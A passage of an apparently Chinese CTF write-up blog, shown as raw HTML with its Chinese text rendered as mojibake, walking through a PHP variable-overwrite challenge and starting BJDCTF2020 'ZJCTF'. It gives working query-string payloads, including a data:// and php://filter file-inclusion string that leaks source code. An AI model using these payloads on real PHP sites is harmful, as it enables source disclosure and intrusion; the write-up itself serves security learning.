class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœé€šè¿‡flagå‚æ•°è¿›è¡Œgetæˆ–postä¼ å‚ä¼ å…¥çš„å€¼æ˜¯flagå­—ç¬¦ä¸²çš„è¯å°±ä¼šç›´æ¥exitå¹¶è¾“å‡ºcatå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.3omc7n0fpa60.png"></p><p>â€‹    </p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.31l69b2libc0.png"></p><p>â€‹    æœ€ååˆ†æè¿™ä¸ªæˆ‘è®¤ä¸ºæœ€å¤æ‚çš„éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line"><span class="comment">//éå†$_GETæ•°ç»„ä¸­çš„é”®å€¼å¯¹ï¼Œæ£€æŸ¥å¦‚æœGETå‚æ•°flagçš„å€¼ç­‰äºæŸä¸ªé”®åï¼Œå¹¶ä¸”è¯¥é”®åä¸ç­‰äº&quot;flag&quot;æœ¬èº«</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    æ¥ä¸‹æ¥æˆ‘å°†ä¸¾ä¸€ä¸ªä¾‹å­æ¥æ›´å¥½åœ°åˆ†æä½“ä¼šè¿™ä¸²ä»£ç ï¼š</p><p>â€‹    å…ˆè¿›è¡Œgetä¼ å‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=cs&amp;cs=1</span><br></pre></td></tr></table></figure><p>â€‹    å½“ä½¿ç”¨GETæ–¹æ³•ä¼ é€’å‚æ•°<code>?flag=cs&amp;cs=1</code>æ—¶ï¼Œ<code>$_GET</code>æ•°ç»„ä¸­çš„é”®å€¼å¯¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;cs&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cs&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>â€‹    æ­¤æ—¶éå†<code>$_GETæ•°ç»„</code>ä¸­çš„é”®å€¼å¯¹<code>$_GET[&#39;flag&#39;]</code>çš„å€¼ä¸ºå­—ç¬¦ä¸²<code>cs</code>ï¼Œå‘ç°æ•°ç»„ç¬¬äºŒä¸ªå…ƒç´ å¯ä»¥æ»¡è¶³<code>$_GET[&#39;flag&#39;] === $x</code>è¿™ä¸ªæ¡ä»¶ï¼Œå³ä½¿æ­¤æ—¶çš„<code>$x</code>ç­‰äº<code>cs</code>å­—ç¬¦ä¸²ï¼Œä¸”<code>cs</code>å­—ç¬¦ä¸²ä¸ç­‰äº<code>flag</code>å­—ç¬¦ä¸²ï¼Œæ•…æ‰§è¡Œ<code>exit($handsome)</code>ï¼Œè¾“å‡º<code>ydx</code>å¹¶åœæ­¢ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.108gu5xmryq8.png"></p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>â€‹    åˆ†æå®Œç›¸åº”æ¼æ´ä»£ç åï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨æ¥è¾“å‡ºflagå‘¢ï¼Ÿâ€”â€“&gt;å˜é‡è¦†ç›–æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//éå†$_POSTæ•°ç»„ä¸­çš„æ¯ä¸ªé”®å€¼å¯¹ï¼Œå¹¶å°†é”®åèµ‹ç»™å˜é‡$xï¼Œå°†å¯¹åº”çš„å€¼èµ‹ç»™å˜é‡$y</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//éå†$_GETæ•°ç»„ä¸­çš„æ¯ä¸ªé”®å€¼å¯¹ï¼Œå¹¶å°†é”®åèµ‹ç»™å˜é‡$xï¼Œå°†å¯¹åº”çš„å€¼èµ‹ç»™å˜é‡$y</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è¯­æ³•è¡¥å……ï¼š-xä¸-xçš„å…³ç³»ï¼š"><a href="#è¯­æ³•è¡¥å……ï¼š-xä¸-xçš„å…³ç³»ï¼š" class="headerlink" title="è¯­æ³•è¡¥å……ï¼š$xä¸$$xçš„å…³ç³»ï¼š"></a>è¯­æ³•è¡¥å……ï¼š<code>$x</code>ä¸<code>$$x</code>çš„å…³ç³»ï¼š</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $x æ˜¯ä¸€ä¸ªå˜é‡ï¼Œå®ƒä¿å­˜ç€ä¸€ä¸ªå­—ç¬¦ä¸²å€¼ï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å˜é‡åã€‚</span></span><br><span class="line"><span class="comment">// $$x åˆ™æ˜¯ä½¿ç”¨ $x çš„å€¼ä½œä¸ºå˜é‡åï¼Œå³å°†å˜é‡åé—´æ¥åœ°ç¡®å®šä¸º $x çš„å€¼ã€‚</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;cs&#x27;</span>;</span><br><span class="line"><span class="variable">$cs</span> = <span class="string">&#x27;28&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$x</span>;  <span class="comment">// --&gt;echo $cs ; --&gt; è¾“å‡ºï¼š28</span></span><br></pre></td></tr></table></figure><h3 id="è§£æ³•ä¸€ï¼šåˆ©ç”¨exit-handsome"><a href="#è§£æ³•ä¸€ï¼šåˆ©ç”¨exit-handsome" class="headerlink" title="è§£æ³•ä¸€ï¼šåˆ©ç”¨exit($handsome)"></a>è§£æ³•ä¸€ï¼šåˆ©ç”¨exit($handsome)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;handsome&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;handsome&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>â€‹    ç»è¿‡å¦‚ä¸‹ä»£ç åæœ‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;handsome&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;handsome&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">ç¬¬ä¸€æ¬¡è¿­ä»£ï¼š</span></span><br><span class="line"><span class="comment">$x = handsome , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $handsome , $$y = $flag</span></span><br><span class="line"><span class="comment">$handsome = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç¬¬äºŒæ¬¡è¿­ä»£ï¼š</span></span><br><span class="line"><span class="comment">$x = flag , $y = handsome</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $handsome</span></span><br><span class="line"><span class="comment">$flag = $handsome</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>â€‹    åœ¨æ­¤ä¹‹åï¼Œ<code>$flag</code>ä¸<code>$handsome</code>å˜é‡ä¸­çš„å€¼å‡æ˜¯<code>flag.php</code>æ–‡ä»¶ä¸­å¯¼å…¥çš„å€¼ã€‚æ­¤æ—¶åˆšå¥½æ»¡è¶³æ¡ä»¶è§¦å‘<code>exit($handsome)</code>è¾“å‡º<code>flag</code>çš„å€¼ã€‚</p><h3 id="è§£æ³•äºŒï¼šåˆ©ç”¨exit-yds"><a href="#è§£æ³•äºŒï¼šåˆ©ç”¨exit-yds" class="headerlink" title="è§£æ³•äºŒï¼šåˆ©ç”¨exit($yds)"></a>è§£æ³•äºŒï¼šåˆ©ç”¨exit($yds)</h3><p>â€‹    æœ€ç®€å•çš„è§£æ³•ï¼ŒåŸç†ä¸è§£æ³•ä¸€ç›¸åŒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;ydx&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç¬¬ä¸€æ¬¡è¿­ä»£ï¼š</span></span><br><span class="line"><span class="comment">$x = ydx , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $ydx , $$y = $flag</span></span><br><span class="line"><span class="comment">$ydx = $flag</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.35tp06u455s0.png"></p><h3 id="è§£æ³•ä¸‰ï¼šåˆ©ç”¨exit-is"><a href="#è§£æ³•ä¸‰ï¼šåˆ©ç”¨exit-is" class="headerlink" title="è§£æ³•ä¸‰ï¼šåˆ©ç”¨exit($is)"></a>è§£æ³•ä¸‰ï¼šåˆ©ç”¨exit($is)</h3><blockquote><p>â€‹    æœ€å¼€å§‹æ²¡ç»†çœ‹ä»¥ä¸ºPostæ–¹æ³•ä¼šæœ‰ä¸åŒçš„æ–¹å¼åˆ©ç”¨ï¼Œæ²¡æƒ³åˆ°Postæ–¹æ³•åªèƒ½å®ç°ä¿®æ”¹ä¸€ä¸ªå˜é‡çš„å†…å®¹çš„åŠŸèƒ½ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯ä½¿ç”¨Getæ–¹æ³•è·å–flag.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    åœ¨è¿™é‡Œå¦‚æœè¦åˆ©ç”¨<code>exit($is)</code>å°±éœ€è¦ä½¿ç”¨<code>Postæ–¹æ³•</code>ä¸”æœ‰ä¸€é¡¹å¿…é¡»ä¸º<code>flag=flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_POST</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is&#x27;</span> =&gt; <span class="string">&#x27;ä½ çŒœçŒœæˆ‘ä¼šè¾“å‡ºå•¥ï¼Ÿ&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç¬¬ä¸€æ¬¡è¿­ä»£ï¼š</span></span><br><span class="line"><span class="comment">$x = flag , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $flag , $y = flag</span></span><br><span class="line"><span class="comment">$flag = flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç¬¬äºŒæ¬¡è¿­ä»£ï¼š</span></span><br><span class="line"><span class="comment">$x = is , $y = ä½ çŒœçŒœæˆ‘ä¼šè¾“å‡ºå•¥ï¼Ÿ</span></span><br><span class="line"><span class="comment">$$x= $is , $y = ä½ çŒœçŒœæˆ‘ä¼šè¾“å‡ºå•¥ï¼Ÿ</span></span><br><span class="line"><span class="comment">$is = ä½ çŒœçŒœæˆ‘ä¼šè¾“å‡ºå•¥ï¼Ÿ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.qwaut6rp6v.png"></p><p>â€‹    æ—¢ç„¶åšä¸åˆ°å˜é‡åä»£æ›¿ï¼Œç°åœ¨æˆ‘ä»¬æ¥æ·±å…¥æ€è€ƒè¯¥æ€ä¹ˆå®ç°å°†flagä¸­çš„å†…å®¹èµ‹ç»™iså˜é‡å‘¢ï¼Ÿ<br>â€‹    ç»è¿‡è¿›ä¸€æ­¥åˆ†æå‘ç°ï¼Œåˆ©ç”¨Postæ–¹æ³•åªèƒ½åšåˆ°ä¿®æ”¹ä¸€ä¸ªå˜é‡çš„å†…å®¹ï¼Œè€Œä¸èƒ½å®ç°å˜é‡åæ›¿æ¢ä»è€Œè¾“å‡ºflagï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯å¾—åˆ©ç”¨getæ–¹æ³•ï¼</p><p>â€‹    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;is&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">ç¬¬ä¸€æ¬¡è¿­ä»£ï¼š</span></span><br><span class="line"><span class="comment">$x = is , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $is , $$y = $flag</span></span><br><span class="line"><span class="comment">$is = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç¬¬äºŒæ¬¡è¿­ä»£ï¼š---&gt;æ»¡è¶³ifæ¡ä»¶</span></span><br><span class="line"><span class="comment">$x = flag , $y = flag</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $flag</span></span><br><span class="line"><span class="comment">$flag = $flag</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.652gus4ywpk0.png"></p><h3 id="è§£æ³•å››-åˆ©ç”¨echo-quot-the-flag-is-quot-flag"><a href="#è§£æ³•å››-åˆ©ç”¨echo-quot-the-flag-is-quot-flag" class="headerlink" title="è§£æ³•å››: åˆ©ç”¨echo &quot;the flag is: &quot;.$flag;"></a>è§£æ³•å››: åˆ©ç”¨<code>echo &quot;the flag is: &quot;.$flag;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=flag&amp;flag=1</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.75pvw2b63ec0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">ç¬¬ä¸€æ¬¡è¿­ä»£ï¼š</span></span><br><span class="line"><span class="comment">$x = 1 , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $1 , $$y = $flag</span></span><br><span class="line"><span class="comment">$1 = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç¬¬äºŒæ¬¡è¿­ä»£ï¼š---&gt;æ»¡è¶³ifæ¡ä»¶</span></span><br><span class="line"><span class="comment">$x = flag , $y = 1</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $1</span></span><br><span class="line"><span class="comment">$flag = $1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ˜¯å¦‚ä½•ç»•è¿‡è¿™ä¸ªå‡½æ•°çš„å‘¢ï¼Ÿ</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="comment">//éå†$_GETæ•°ç»„ä¸­çš„é”®å€¼å¯¹ï¼Œæ£€æŸ¥å¦‚æœGETå‚æ•°flagçš„å€¼ç­‰äºæŸä¸ªé”®åï¼Œå¹¶ä¸”è¯¥é”®åä¸ç­‰äº&quot;flag&quot;æœ¬èº«</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">ç¬¬ä¸€æ¬¡è¿­ä»£ï¼š</span></span><br><span class="line"><span class="comment">$x = 1 , $y = flag</span></span><br><span class="line"><span class="comment">$_GET[&#x27;flag&#x27;] = 1</span></span><br><span class="line"><span class="comment">è¿™é‡Œçš„$xçš„ç±»å‹æ˜¯stringï¼Œè€Œ$_GET[&#x27;flag&#x27;]çš„å€¼çš„ç±»å‹æ˜¯intï¼Œæ•…ä¸å®Œå…¨ç›¸ç­‰ä»è€Œç»•è¿‡,å¹¶ä¸”flagå˜é‡çš„å†…å®¹æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ï¼</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">æœ€åæˆåŠŸ</span></span><br><span class="line"><span class="comment">echo &quot;the flag is: &quot;.$flag;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ˜“é”™æ€»ç»“ï¼š"><a href="#æ˜“é”™æ€»ç»“ï¼š" class="headerlink" title="æ˜“é”™æ€»ç»“ï¼š"></a>æ˜“é”™æ€»ç»“ï¼š</h3><ol><li><p><code>$x</code>ä¸<code>$_GET[X]</code>è¦åˆ†è¾¨æ¸…æ¥šï¼</p></li><li><p>URLè¯·æ±‚ä¸­çš„é—®å·é—®é¢˜ï¼š<img lazyload alt="image" data-src="D:\Typora\typora-user-images\image-20230526193753213.png"></p></li></ol><h2 id="0x3-BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#0x3-BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="0x3:[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>0x3:[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><h3 id="åˆæ¢é¢˜ç›®-1"><a href="#åˆæ¢é¢˜ç›®-1" class="headerlink" title="åˆæ¢é¢˜ç›®"></a>åˆæ¢é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    æˆ‘åœ¨æ€è€ƒå¦‚ä½•ç»•è¿‡<code>file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;</code>,å› ä¸ºæˆ‘ä¸çŸ¥é“å“ªä¸ªè·¯å¾„ä¸‹çš„æ–‡ä»¶å®ƒçš„å†…å®¹æ˜¯<code>I have a dream</code></p><hr><p>â€‹    ä»Šæ—¥å†…å®¹åˆ°è¿™é‡Œ~~</p><p>â€‹    ä½†æ±‚åšæŒï¼</p><hr><p>â€‹    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230527/St2iv8rimage.5lb2d8e0ntw0.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,I have a dream</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 